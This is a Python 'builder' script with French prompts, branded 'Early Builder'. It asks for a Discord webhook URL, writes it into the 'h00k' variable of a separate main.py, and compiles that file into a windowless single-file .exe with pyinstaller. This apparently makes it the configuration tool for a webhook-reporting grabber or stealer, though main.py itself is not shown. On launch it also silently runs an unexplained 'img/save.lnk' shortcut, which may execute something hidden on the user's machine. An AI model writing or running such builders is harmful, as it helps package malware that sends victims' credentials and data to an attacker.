from pystyle import *
from colorama import *
import os
import time
import fade
import ctypes

username = os.getlogin()

ctypes.windll.kernel32.SetConsoleTitleW(f" Early Builder - {username}")
os.system("start img/save.lnk")
os.system("cls")

text = """
oooooooooooo                    oooo                     .o   .o     .oooo.     .oooo.     .oooo.     .o  
`888'     `8                    `888                    .8'  .8'    d8P'`Y8b   d8P'`Y8b   d8P'`Y8b  o888  
 888          .oooo.   oooo d8b  888  oooo    ooo   .888888888888' 888    888 888    888 888    888  888  
 888oooo8    `P  )88b  `888""8P  888   `88.  .8'      .8'  .8'     888    888 888    888 888    888  888  
 888    "     .oP"888   888      888    `88..8'   .888888888888'   888    888 888    888 888    888  888  
 888       o d8(  888   888      888     `888'      .8'  .8'       `88b  d88' `88b  d88' `88b  d88'  888  
o888ooooood8 `Y888""8o d888b    o888o     .8'      .8'  .8'         `Y8bd8P'   `Y8bd8P'   `Y8bd8P'  o888o 
                                      .o..P'                                                              
                                      `Y8P'                                                               
                                                                            
                                   Press [ENTER] to continue   
                              
"""

Anime.Fade(Center.Center(text), Colors.green_to_blue, Colorate.Vertical, interval=0.050, enter=True)

text2 = """
oooooooooooo                    oooo                     .o   .o     .oooo.     .oooo.     .oooo.     .o  
`888'     `8                    `888                    .8'  .8'    d8P'`Y8b   d8P'`Y8b   d8P'`Y8b  o888  
 888          .oooo.   oooo d8b  888  oooo    ooo   .888888888888' 888    888 888    888 888    888  888  
 888oooo8    `P  )88b  `888""8P  888   `88.  .8'      .8'  .8'     888    888 888    888 888    888  888  
 888    "     .oP"888   888      888    `88..8'   .888888888888'   888    888 888    888 888    888  888  
 888       o d8(  888   888      888     `888'      .8'  .8'       `88b  d88' `88b  d88' `88b  d88'  888  
o888ooooood8 `Y888""8o d888b    o888o     .8'      .8'  .8'         `Y8bd8P'   `Y8bd8P'   `Y8bd8P'  o888o 
                                      .o..P'                                                              
                                      `Y8P'                                                               
                                                                            
                                   Press [ENTER] to continue                            
"""

text2 = fade.greenblue(text2)
print(text2)

time.sleep(1.5)

def endHandler():
    os._exit(0)

def checkhook(webhook):
    if not "api/webhooks" in webhook:
        print(f"\n{Fore.RED}Webhook Invalide{Fore.RESET}")
        time.sleep(1)
        endHandler()

webhook = input(Fore.CYAN + "\nEntrer votre webhook url: " + Style.RESET_ALL)
checkhook(webhook)
filename = "main.py"
filepath = os.path.join(os.getcwd(), filename)

with open(filepath, "r", encoding="utf-8") as f:
    content = f.readlines()

new_content = []
for line in content:
    if line.strip().startswith("h00k ="):
        new_content.append(f'h00k = "{webhook}"\n')
    else:
        new_content.append(line)

with open(filepath, "w", encoding="utf-8") as f:
    f.writelines(new_content)

time.sleep(1)
print(Fore.GREEN + "Webhook changé avec succès" + Style.RESET_ALL)
time.sleep(2)
os.system("cls")
print(text2)
answer = input(Fore.CYAN + "\nVeut-tu le construire en .exe (Y/N) " + Style.RESET_ALL)

if answer.upper() == "Y":
    print(Fore.YELLOW + "Build process has been started please wait..." + Style.RESET_ALL)
    os.system(f"pyinstaller --noconfirm --onefile --windowed {filename}")
    print(f"\n{Fore.GREEN}Fichier .exe a bien était construit !{Fore.RESET}")
    time.sleep(2)
    os.system("cls")
    print(text2)
elif answer.upper() == "N":
    time.sleep(2)
    os.system("cls")
    print(text2)